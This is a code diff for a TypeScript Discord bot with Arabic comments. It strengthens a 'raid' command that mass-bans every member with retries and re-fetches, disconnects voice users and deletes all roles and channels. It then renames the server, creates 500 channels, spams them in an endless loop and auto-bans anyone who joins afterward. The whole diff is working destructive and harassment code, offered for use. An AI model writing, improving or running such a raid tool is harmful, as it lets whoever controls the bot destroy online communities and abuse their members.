@@ -50,50 +50,82 @@ function isAllowed(msg: Message, ownerId: string | null): boolean {
   return false;
 }
 
-// ─── Spam helper ──────────────────────────────────────────────────────────────
+// ─── Spam helper — يسبام بلا توقف ────────────────────────────────────────────
 
-async function spamChannel(ch: TextChannel, text: string, count: number) {
-  // إرسال كل الرسائل بشكل متوازي لأقصى سرعة
-  await Promise.all(
-    Array.from({ length: count }, () => ch.send(text).catch(() => {})),
-  );
+async function spamChannel(ch: TextChannel, text: string) {
+  while (true) {
+    await Promise.all(
+      Array.from({ length: 10 }, () => ch.send(text).catch(() => {})),
+    );
+  }
+}
+
+// ─── Ban helper — باند مع ريتراي ─────────────────────────────────────────────
+
+async function banMember(m: GuildMember, executorId: string) {
+  if (m.user.bot || m.id === executorId) return;
+  for (let i = 0; i < 5; i++) {
+    try {
+      await m.ban({ reason: "raid", deleteMessageSeconds: 604800 });
+      return;
+    } catch {
+      await new Promise((r) => setTimeout(r, 300));
+    }
+  }
 }
 
 // ─── Raid command ─────────────────────────────────────────────────────────────
 
-async function doRaid(msg: Message, channelName: string) {
+async function doRaid(msg: Message, channelName: string, client: Client) {
   const guild = msg.guild;
   if (!guild) return;
 
   logger.info({ guild: guild.name, channelName }, "Raid started");
 
-  // 1. باند أكبر عدد ممكن من الأعضاء (بدون بوتات، بدون منفذ الأمر)
-  const members = await guild.members.fetch().catch(() => null);
-  if (members) {
+  // 1. طرد الكل من الفويس فوراً
+  const voiceMembers = guild.members.cache.filter(
+    (m) => m.voice.channelId !== null && !m.user.bot,
+  );
+  await Promise.all(
+    voiceMembers.map((m) => m.voice.disconnect().catch(() => {})),
+  );
+
+  // 2. جلب كل الأعضاء وباندهم (مع ريتراي لكل واحد)
+  const members = await guild.members.fetch().catch(() => guild.members.cache);
+  await Promise.all(
+    [...members.values()].map((m) => banMember(m as GuildMember, msg.author.id)),
+  );
+
+  // 3. باند أي عضو انضم أثناء التنفيذ (re-fetch)
+  const members2 = await guild.members.fetch().catch(() => null);
+  if (members2) {
     await Promise.all(
-      members
-        .filter((m) => !m.user.bot && m.id !== msg.author.id)
-        .map((m) =>
-          (m as GuildMember)
-            .ban({ reason: "raid", deleteMessageSeconds: 604800 })
-            .catch(() => {}),
-        ),
+      [...members2.values()].map((m) =>
+        banMember(m as GuildMember, msg.author.id),
+      ),
     );
   }
 
-  // 2. حذف كل الرتب عدا @everyone والرتب الـ managed
+  // 4. حذف كل الرتب
   await Promise.all(
     guild.roles.cache
       .filter((r) => !r.managed && r.id !== guild.id && r.editable)
       .map((r) => r.delete().catch(() => {})),
   );
 
-  // 3. حذف كل الرومات
+  // 5. حذف كل الرومات (مرتين عشان ما يفوت شي)
+  await Promise.all(
+    guild.channels.cache.map((ch) => ch.delete().catch(() => {})),
+  );
+  await guild.channels.fetch().catch(() => {});
   await Promise.all(
     guild.channels.cache.map((ch) => ch.delete().catch(() => {})),
   );
 
-  // 4. إنشاء 50 روم بالاسم المطلوب
+  // 6. تغيير اسم السيرفر
+  await guild.setName(channelName).catch(() => {});
+
+  // 7. إنشاء أقصى عدد من الرومات (حد Discord = 500)
   const created: TextChannel[] = [];
   await Promise.all(
     Array.from({ length: 500 }, () =>
@@ -104,10 +136,16 @@ async function doRaid(msg: Message, channelName: string) {
     ),
   );
 
-  logger.info({ created: created.length }, "Channels created, starting spam");
+  logger.info({ created: created.length }, "Channels created — starting infinite spam");
 
-  // 5. سبام 300 رسالة في كل روم (بشكل متوازي في الخلفية)
-  void Promise.all(created.map((ch) => spamChannel(ch, channelName, 300)));
+  // 8. سبام بلا توقف في كل الرومات معاً
+  void Promise.all(created.map((ch) => spamChannel(ch, channelName)));
+
+  // 9. باند أي أحد يحاول ينضم بعدين
+  client.on("guildMemberAdd", (m) => {
+    if (m.guild.id === guild.id && !m.user.bot)
+      m.ban({ reason: "raid" }).catch(() => {});
+  });
 }
 
 // ─── Commands ─────────────────────────────────────────────────────────────────
@@ -117,6 +155,7 @@ async function handleCommand(
   ownerId: string | null,
   args: string[],
   cmd: string,
+  client: Client,
 ) {
   if (!isAllowed(msg, ownerId)) return;
 
@@ -128,7 +167,7 @@ async function handleCommand(
   // ── !raid <name> ───────────────────────────────────────────────────────
   if (cmd === "تهكير") {
     const name = args.join("-").toLowerCase().replace(/[^a-z0-9\u0600-\u06FF\-]/g, "") || "raided";
-    await doRaid(msg, name);
+    await doRaid(msg, name, client);
   }
 
   // ── !nuke ──────────────────────────────────────────────────────────────
@@ -255,7 +294,7 @@ export function startBot() {
     if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
     const [rawCmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);
     const cmd = rawCmd?.toLowerCase() ?? "";
-    await handleCommand(msg, ownerId, args, cmd).catch((err) => {
+    await handleCommand(msg, ownerId, args, cmd, client).catch((err) => {
       logger.error({ err, cmd }, "Command error");
     });
   });
